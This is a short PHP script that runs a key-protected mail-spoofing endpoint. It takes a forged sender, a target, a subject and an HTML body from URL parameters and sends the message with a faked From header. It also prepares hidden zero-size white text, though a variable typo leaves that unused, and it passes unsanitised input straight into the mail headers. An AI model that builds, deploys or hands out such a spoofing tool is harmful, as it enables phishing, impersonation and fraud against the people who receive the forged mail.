<?php

$spoof = $_GET['spoof'];
$target = $_GET['target'];
$title = $_GET['title'];
$body = $_GET['body'];
$key = $_GET['key'];

if($key != "mailspoofingapi"){
	echo "Invalid key.";
}else{

if($spoof == null || $target == null || $title == null || $body == null){
echo "All arguments must be full.";
}else{
$bodu .= '<h6 style="font-size: 0px;"><font color="white">';
$reply = $target;

$headers  = "From: $spoof\r\n";
$headers .= "Reply-To: $reply\r\n";
$headers .= 'MIME-Version: 1.0' . "\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";

mail($target, $title, $body, $headers);
echo "Mail sent";
echo "\r\n";
echo $spoof;
echo "\r\n";
echo $target;
echo "\n";
echo $title;
echo "\n";
echo $body;
	}
}
?>


